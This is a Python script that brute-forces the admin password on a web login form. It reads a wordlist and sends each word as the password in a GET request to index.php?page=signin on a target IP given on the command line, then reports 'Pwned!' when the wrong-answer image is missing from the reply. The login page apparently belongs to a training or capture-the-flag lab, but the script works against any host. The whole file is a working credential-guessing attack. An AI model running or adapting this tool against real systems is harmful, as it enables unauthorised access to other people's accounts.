#!/usr/bin/python3

import sys
import os
import requests
import time

# ANSI Colors
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
RESET = "\033[0m"

def is_valid_ip(ip: str) -> bool:
    """
    Checks if a string has a valid IP address representation.
    Args:
        ip (str): String, supposed to contain an IP address, to validate
    
    Returns:
        bool: Whether `ip` is a valid IP address
    """

    try:
        parts = ip.split('.')
        return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
    except (AttributeError, TypeError, ValueError):
        return False

def get_wordlist(path: str) -> list[str] | None:
    """
    Load a wordlist from a file.
    
    Args:
        path (str): Path to the wordlist file
        
    Returns:
        list[str] | None: List of words if successful, `None` if failed
    """

    if not os.path.exists(path):
        print(f"{RED}[x]{RESET} Wordlist file {path} doesn't exist", file=sys.stderr)
        return None

    try:
        with open(path, 'r', encoding='latin-1') as f:
            wordlist = f.read().splitlines()
        print(f"{GREEN}[+]{RESET} Loaded {len(wordlist)} words from local file")
        return wordlist
    except Exception as e:
        print(f"{RED}[x]{RESET} Error reading wordlist file: {e}")
        return None

def main():
    if len(sys.argv) != 3:
        print(f"{RED}[x]{RESET} Invalid number of arguments, expected 2 got {len(sys.argv) - 1}", file=sys.stderr)
        sys.exit(1)

    target_ip = sys.argv[1]
    if len(target_ip) == 0 or not is_valid_ip(target_ip):
        print(f"{RED}[x]{RESET} Invalid target IP", file=sys.stderr)
        sys.exit(1)
    
    if len(sys.argv[2]) == 0:
        print(f"{RED}[x]{RESET} Invalid wordlist file path", file=sys.stderr)
        sys.exit(1)

    wordlist = get_wordlist(sys.argv[2])
    if wordlist == None:
        sys.exit(1)

    start = time.time()
    for word in wordlist:
        url = f"http://{target_ip}/index.php?page=signin&username=admin&password={word}&Login=Login#"

        try:
            req = requests.get(url)
            if req.status_code != 200:
                print(f"{RED}[x]{RESET} Server returned status code {req.status_code}")
                continue

            content = str(req.content)
            if "images/WrongAnswer.gif" not in content:
                print(f"{GREEN}[+]{RESET} Pwned! User: admin Password: {word}")
                end = time.time()
                duration = end - start
                print(f"{BLUE}[i]{RESET} Took {int(duration // 3600)}h {int((duration % 3600) // 60)}m {duration % 60:.1f}s")
                break

        except Exception as e:
            print(f"{RED}[x]{RESET} Failed to use word \"{word}\": {e}")

if __name__ == '__main__':
    main()
